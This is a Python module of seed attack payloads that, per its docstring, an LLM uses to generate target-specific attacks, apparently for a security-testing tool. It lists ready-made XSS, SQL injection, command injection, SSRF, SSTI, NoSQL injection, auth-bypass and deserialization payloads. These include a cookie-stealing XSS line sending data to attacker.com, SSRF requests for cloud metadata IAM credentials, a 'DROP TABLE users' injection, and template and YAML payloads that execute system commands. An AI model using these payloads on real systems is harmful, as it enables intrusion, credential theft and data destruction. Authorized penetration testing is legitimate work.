"""
Seed payloads — starting points for LLM-powered payload generation.

These are NOT the final payloads. The LLM uses these as examples and
inspiration to generate context-aware, target-specific payloads.
"""

from __future__ import annotations


XSS_SEEDS: list[str] = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '<svg onload=alert(1)>',
    '{{constructor.constructor("return this")()}}',
    "${alert(1)}",
    '<img src=x onerror="fetch(\'https://attacker.com/?\'+document.cookie)">',
    "'-alert(1)-'",
    '<details open ontoggle=alert(1)>',
    '"><svg/onload=confirm(1)//',
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
]

SSRF_SEEDS: list[str] = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://[::1]",
    "http://0x7f000001",
    "http://2130706433",
    "http://0177.0.0.1",
    "http://127.1",
    "file:///etc/passwd",
    "gopher://127.0.0.1:25/",
    "dict://127.0.0.1:11211/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
]

SQLI_SEEDS: list[str] = [
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "1' AND '1'='1",
    "admin'--",
    "' OR ''='",
    "1; DROP TABLE users--",
    "' UNION SELECT username,password FROM users--",
    "1' ORDER BY 1--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "') OR ('1'='1",
    "' WAITFOR DELAY '0:0:5'--",
    "1' AND (SELECT SLEEP(5))--",
]

COMMAND_INJECTION_SEEDS: list[str] = [
    "; id",
    "| id",
    "$(id)",
    "`id`",
    "& id",
    "|| id",
    "; cat /etc/passwd",
    "| whoami",
    "$(whoami)",
    "; ping -c 3 127.0.0.1",
    "%0a id",
    "'; exec('id')#",
]

SSTI_SEEDS: list[str] = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{{config}}",
    "{{self.__class__.__mro__}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{% import os %}{{ os.popen('id').read() }}",
]

IDOR_SEEDS: list[dict[str, str]] = [
    {"original": "1", "test": "2", "technique": "sequential"},
    {"original": "100", "test": "101", "technique": "sequential"},
    {"original": "user123", "test": "user124", "technique": "sequential"},
    {"original": "me", "test": "1", "technique": "id_replacement"},
    {"original": "current", "test": "admin", "technique": "role_escalation"},
]

AUTH_BYPASS_SEEDS: list[dict[str, str]] = [
    {"header": "X-Forwarded-For", "value": "127.0.0.1"},
    {"header": "X-Original-URL", "value": "/admin"},
    {"header": "X-Rewrite-URL", "value": "/admin"},
    {"method": "GET", "alternative": "HEAD"},
    {"method": "GET", "alternative": "POST"},
    {"path_modification": "/admin", "bypass": "/admin/"},
    {"path_modification": "/admin", "bypass": "/Admin"},
    {"path_modification": "/admin", "bypass": "/admin;/"},
    {"path_modification": "/admin", "bypass": "/%61dmin"},
]

NOSQL_INJECTION_SEEDS: list[str] = [
    '{"$gt":""}',
    '{"$ne":""}',
    '{"$regex":".*"}',
    "true, $where: '1 == 1'",
    "'; return '' == '",
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
]

DESERIALIZATION_SEEDS: list[dict[str, str]] = [
    {"format": "json", "payload": '{"__proto__": {"isAdmin": true}}'},
    {"format": "json", "payload": '{"constructor": {"prototype": {"isAdmin": true}}}'},
    {"format": "yaml", "payload": "!!python/object/apply:os.system ['id']"},
    {"format": "xml", "payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'},
]


def get_seeds_for_category(category: str) -> list:
    """Get seed payloads for a vulnerability category."""
    seeds_map = {
        "xss": XSS_SEEDS,
        "ssrf": SSRF_SEEDS,
        "sqli": SQLI_SEEDS,
        "command_injection": COMMAND_INJECTION_SEEDS,
        "ssti": SSTI_SEEDS,
        "idor": IDOR_SEEDS,
        "auth": AUTH_BYPASS_SEEDS,
        "nosql": NOSQL_INJECTION_SEEDS,
        "deserialization": DESERIALIZATION_SEEDS,
    }
    return seeds_map.get(category, [])
